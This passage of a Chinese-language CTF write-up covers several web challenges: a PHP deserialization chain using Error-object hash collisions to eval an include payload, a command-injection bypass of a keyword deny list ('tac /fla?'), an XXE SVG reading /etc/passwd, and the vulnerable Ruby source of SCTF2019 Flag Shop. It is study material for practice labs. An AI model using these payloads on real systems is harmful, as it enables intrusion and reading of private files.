class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;echo 123;?&gt; echo 456;&#x27;</span>;<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果 123 echo 456;</span><br></code></pre></td></tr></table></figure><p>先执行<code>echo 123;</code>，然后<code>?&gt;</code>标记PHP代码块结束。<code>echo 456;</code>直接被当成普通文本输出。</p><p>有些师傅也用这种方法去闭合：<code>?&gt;&lt;?php payload ?&gt;</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br>&#125;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;include $_GET[1];?&gt;&#x27;</span>;<span class="hljs-comment">//注意这个写法！</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-number">1</span>); <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-number">2</span>);<br><br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>();<br><span class="hljs-variable">$o</span>-&gt;syc = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$o</span>-&gt;lover = <span class="hljs-variable">$b</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$o</span>));<br><span class="hljs-comment">//然后加个&amp;1=/flag就行</span><br></code></pre></td></tr></table></figure><p>然后注意那两个<code>Error</code>一定要写在同一行上(因为报错信息里会显示行号，换了行报错信息就不一样了)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//test</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>, <span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>, <span class="hljs-number">2</span>);<span class="hljs-comment">//注意这里需要写在一行上</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a!=b&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md5相等&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sha1相等&quot;</span>;<br>&#125;<br><span class="hljs-comment">//结果：</span><br><span class="hljs-built_in">Error</span>: payload in /box/script.php:<span class="hljs-number">2</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;Error: payload in /box/script.php:2</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;a!=b</span><br>md5相等<br>sha1相等<br><span class="hljs-comment">//test</span><br><span class="hljs-comment">//把$a $b放在两行：</span><br><span class="hljs-built_in">Error</span>: payload in /box/script.php:<span class="hljs-number">2</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;Error: payload in /box/script.php:3</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;a!=b</span><br></code></pre></td></tr></table></figure><p>有些师傅用的取反方法绕过正则，这样的话可以直接包含<code>/flag</code>文件：</p><p>这么操作相当于<code>include &#39;/flag&#39;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover))) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>)) &#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;?&gt;&lt;?=include ~&quot;</span> . <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$s</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">2</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>();<br><span class="hljs-variable">$c</span>-&gt;syc = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>-&gt;lover = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>)));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>不知道为啥这种方法出不来结果。。。 </p><h2 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$comm1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;comm1&#x27;</span>];<br><span class="hljs-variable">$comm2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;comm2&#x27;</span>];<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="hljs-variable">$comm1</span>))<br>    <span class="hljs-variable">$comm1</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, <span class="hljs-variable">$comm2</span>))<br>    <span class="hljs-variable">$comm2</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;#flag in /flag&quot;</span>;<br><br><span class="hljs-variable">$comm1</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$comm1</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br><span class="hljs-variable">$comm2</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$comm2</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;file <span class="hljs-subst">$comm1</span> <span class="hljs-subst">$comm2</span>&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>system(‘file &quot;$com1&quot; &quot;$com2&quot; ’);</code></p><p>system(‘file “<code>&quot;;tac /fla?;&quot;</code>“ “com2”’);</p><p><code>?comm1=&quot;;tac /fla?;&quot;&amp;comm2=1</code></p><h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p><img src="/img/svgmagic1.png" alt="svgmagic1"></p><p>右键看看页面源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>SVG Magic Test System<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Convert SVG to PNG with Magic<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/render&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;svgfile&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Render&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>查了下SVG是什么东西：</p><p><img src="/img/svgmagic2.png" alt="svgmagic2"></p><p>可以看到这东西是基于<code>XML</code>的图形文件格式，想到可能存在<code>XXE</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">//examle.svg<br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">rect</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">&quot;red&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>上传然后抓包：</p><p><img src="/img/svgmagic3.png" alt="svgmagic3"></p><p>后面想着把<code>svg</code>文件改成这种格式尝试读<code>/etc/passwd</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/svgmagic4.png" alt="svgmagic4"></p><p>能读，确定存在<code>xxe</code>，但读<code>/flag</code>没反应。。看了<code>wp</code>才知道可以用这种方法读：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span>flag.txt<br><span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/pwd/</span>代表当前路径<br></code></pre></td></tr></table></figure><h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p><img src="/img/2019flagshop1.png" alt="2019flagshop1"></p><p>商店类型题目，<code>JinKela</code>到达指定价格后才能购买<code>flag</code>，<code>work</code>按钮能赚<code>JinKela</code>，不过一次只能赚个位数。抓包看看怎么个事：</p><p><img src="/img/2019flagshaop2.png" alt="2019flagshaop2"></p><p>这个<code>cookie</code>我用<code>base64</code>解码之后发现是<code>JWT</code>的格式，丢<a href="https://jwt.io/">网站</a>里面分析一下：</p><p><img src="/img/2019flagshop3.png" alt="2019flagshop3"></p><p><code>jkl</code>这东西就是<code>JinKela</code>，但不知道<code>secret</code>没法弄。感觉确实要靠这个解题，不过要想办法拿这个<code>secret</code>。</p><p><code>robots.txt</code>提示<code>/filebak</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/cookies&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/json&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;jwt&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;securerandom&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;erb&#x27;</span><br><br>set <span class="hljs-symbol">:public_folder</span>, <span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/static&#x27;</span><br><br><span class="hljs-variable constant_">FLAGPRICE</span> = <span class="hljs-number">1000000000000000000000000000</span><br><span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] = <span class="hljs-title class_">SecureRandom</span>.hex(<span class="hljs-number">64</span>)<br><br>configure <span class="hljs-keyword">do</span><br>  enable <span class="hljs-symbol">:logging</span><br>  file = <span class="hljs-title class_">File</span>.new(<span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/../log/http.log&#x27;</span>,<span class="hljs-string">&quot;a+&quot;</span>)<br>  file.sync = <span class="hljs-literal">true</span><br>  use <span class="hljs-title class_">Rack</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CommonLogger</span>, file<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">do</span><br>  redirect <span class="hljs-string">&#x27;/shop&#x27;</span>, <span class="hljs-number">302</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/filebak&quot;</span> <span class="hljs-keyword">do</span><br>  content_type <span class="hljs-symbol">:text</span><br>  erb <span class="hljs-variable constant_">IO</span>.binread <span class="hljs-variable constant_">__FILE__</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/api/auth&quot;</span> <span class="hljs-keyword">do</span><br>  payload = &#123; <span class="hljs-symbol">uid:</span> <span class="hljs-title class_">SecureRandom</span>.uuid , <span class="hljs-symbol">jkl:</span> <span class="hljs-number">20</span>&#125;<br>  auth = <span class="hljs-variable constant_">JWT</span>.encode payload,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>  cookies[<span class="hljs-symbol">:auth</span>] = auth<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/api/info&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  json(&#123;<span class="hljs-symbol">uid:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;uid&quot;</span>],<span class="hljs-symbol">jkl:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>]&#125;)<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span><br>  erb <span class="hljs-symbol">:shop</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  auth = auth[<span class="hljs-number">0</span>]<br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-literal">nil</span>?<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br>      puts <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:do</span>] == <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span><br><br>    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + <span class="hljs-title class_">SecureRandom</span>.random_number(<span class="hljs-number">10</span>)<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    <span class="hljs-variable constant_">ERB</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:new</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result<br><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br><br>  <span class="hljs-keyword">if</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>] &lt; <span class="hljs-variable constant_">FLAGPRICE</span> <span class="hljs-keyword">then</span><br><br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;no enough jkl&quot;</span>&#125;)<br>  <span class="hljs-keyword">else</span><br><br>    auth &lt;&lt; &#123;<span class="hljs-symbol">flag:</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;jkl is good thing&quot;</span>&#125;)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">islogin</span><br>  <span class="hljs-keyword">if</span> cookies[<span class="hljs-symbol">:auth</span>].<span class="hljs-literal">nil</span>? <span class="hljs-keyword">then</span><br>    redirect to(<span class="hljs-string">&#x27;/shop&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><span 